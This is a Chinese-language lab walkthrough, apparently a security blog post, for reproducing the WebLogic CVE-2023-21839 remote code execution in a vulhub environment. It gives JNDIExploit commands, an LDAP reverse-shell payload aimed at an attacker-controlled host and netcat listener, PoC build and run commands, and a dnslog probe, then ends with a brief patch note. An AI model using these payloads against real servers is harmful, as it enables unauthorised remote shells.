## 一、环境搭建

使用vulhub快速搭建环境

进入weblogic/CVE-2023-210839目录下，执行命令：

docker-compose up -d

部署完成后直接访问7001端口即可

<http://192.168.5.183:7001/console>

![1682954290_644fd8322d02bf24706dc.png!small](https://image.3001.net/images/20230501/1682954290_644fd8322d02bf24706dc.png!small)

# 二、漏洞利用

此漏洞是需要远程加载恶意类来实现攻击，需要JNDIExploit工具在远程开启服务实现恶意类的加载

java -jar JNDIExploit.jar --ip {接收shell的ip}

  

![1682954336_644fd86030741e64a7766.png!small](https://image.3001.net/images/20230501/1682954336_644fd86030741e64a7766.png!small)

使用java -jar JNDIExploit-1.4-SNAPSHOT.jar -u命令查看payload，使用如下payload：

ldap://{JNDIExploit启动ldap服务的IP}:1389/Basic/ReverseShell/{开启nc服务的ip}/{nc端口}

![1682954347_644fd86bdab57fed7f95e.png!small](https://image.3001.net/images/20230501/1682954347_644fd86bdab57fed7f95e.png!small)

开启nc监听，用来接收回连的shell：

![1682954360_644fd878a0b4bfbf7acb8.png!small](https://image.3001.net/images/20230501/1682954360_644fd878a0b4bfbf7acb8.png!small)

用来发送payload的poc程序：

<https://github.com/4ra1n/CVE-2023-21839>

本PoC是针对CVE-2023-21839编写的，实际上同时覆盖了CVE-2023-21931和CVE-2023-21979。因为这三个漏洞触发机制相同，且补丁方式相同，所以只要存在一个，那么其他两个也存在。

此poc使用go语言编写，使用命令编译成可执行文件：

cd cmd

go build -o CVE-2023-21839.exe

CVE-2023-21839.exe -ip 127.0.0.1 -port 7001 -ldap ldap://127.0.0.1:1389/evil  
  
---  
  
dnslog探测：

CVE-2023-21839.exe -ip {weblogic服务器ip} -port 7001 -ldap
ldap://ug9h0m.dnslog.cn

![1682954373_644fd885e3fca981a5ece.png!small](https://image.3001.net/images/20230501/1682954373_644fd885e3fca981a5ece.png!small)

反弹shell，ldap参数需要修改为JNDIExploit生成的payload

CVE-2023-21839.exe -ip {weblogic服务器ip} -port 7001 -ldap
ldap://{JNDIExploit启动ldap服务的IP}:1389/Basic/ReverseShell/{开启nc服务的ip}/{nc端口}

![1682954397_644fd89d01b83a228e972.png!small](https://image.3001.net/images/20230501/1682954397_644fd89d01b83a228e972.png!small)

# 三、修复方案

目前官方已经发布了补丁，此漏洞还是出在T3和IIOP协议上，禁用此协议也可规避漏洞。

